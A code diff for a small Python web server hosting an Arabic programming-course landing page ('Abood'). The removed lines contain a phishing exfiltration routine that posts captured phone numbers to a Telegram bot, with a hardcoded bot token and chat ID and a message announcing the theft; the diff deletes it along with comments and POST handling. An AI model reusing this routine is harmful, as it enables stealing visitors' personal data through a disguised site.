@@ -1,20 +1,5 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import os
-import urllib.parse
-import requests
-
-# ===== إعدادات البوت =====
-BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
-CHAT_ID = "1170411845"
-
-# ===== دالة الإرسال للبوت =====
-def send_to_telegram(service, phone):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    message = f"✅ [{service}]\n📱 الهاتف: {phone}\n⏳ تم السرقة فوراً!"
-    try:
-        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
-    except:
-        pass
 
 # ===== خادم موقع عبود لتعليم البرمجة =====
 class AboodHandler(BaseHTTPRequestHandler):
@@ -39,7 +24,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
         
-        /* الهيدر */
         .header {
             display: flex; justify-content: space-between; align-items: center;
             padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.06);
@@ -72,7 +56,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         }
         .btn-outline:hover { background: #00d2ff; color: #0f0f1a; }
         
-        /* الهيرو */
         .hero {
             text-align: center; padding: 60px 0 40px;
         }
@@ -87,7 +70,6 @@ class AboodHandler(BaseHTTPRequestHandler):
             color: #8d99b6; font-size: 20px; max-width: 600px; margin: 15px auto 35px;
         }
         
-        /* بطاقات الدورات */
         .courses-grid {
             display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
             gap: 30px; margin: 40px 0;
@@ -116,7 +98,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         .course-card p { color: #b0baca; font-size: 15px; line-height: 1.6; margin-bottom: 18px; }
         .course-card .btn { width: 100%; justify-content: center; }
         
-        /* الفوتر */
         .footer {
             text-align: center; padding: 30px 0 20px;
             border-top: 1px solid rgba(255,255,255,0.05);
@@ -135,7 +116,6 @@ class AboodHandler(BaseHTTPRequestHandler):
 </head>
 <body>
 <div class="container">
-    <!-- الهيدر -->
     <header class="header">
         <div class="logo"><i class="fas fa-code"></i> عبود</div>
         <ul class="nav-links">
@@ -151,7 +131,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         </div>
     </header>
 
-    <!-- الهيرو -->
     <section class="hero">
         <h1>تعلم البرمجة مع <span>عبود</span></h1>
         <p>دروس تفاعلية، مشاريع تطبيقية، ومسارات احترافية للمبتدئين والمحترفين</p>
@@ -160,7 +139,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         </a>
     </section>
 
-    <!-- الدورات -->
     <div class="courses-grid">
         <div class="course-card">
             <span class="course-tag"><i class="fas fa-code"></i> أساسيات</span>
@@ -204,7 +182,6 @@ class AboodHandler(BaseHTTPRequestHandler):
         </div>
     </div>
 
-    <!-- الفوتر -->
     <footer class="footer">
         <div>
             <a href="#"><i class="fab fa-facebook-f"></i></a>
@@ -215,10 +192,8 @@ class AboodHandler(BaseHTTPRequestHandler):
         <p style="margin-top:15px;">&copy; 2026 عبود لتعليم البرمجة. جميع الحقوق محفوظة.</p>
     </footer>
 </div>
-<!-- Font Awesome -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
 <script>
-    // تحويل أزرار الدورات لروابط حقيقية
     document.querySelectorAll('.course-card .btn-primary').forEach(btn => {
         btn.addEventListener('click', function(e) {
             e.preventDefault();
@@ -235,7 +210,6 @@ class AboodHandler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def do_POST(self):
-        # يتم إزالة أي معالجة POST سابقة، فقط نعيد 404
         self.send_response(404)
         self.end_headers()
 
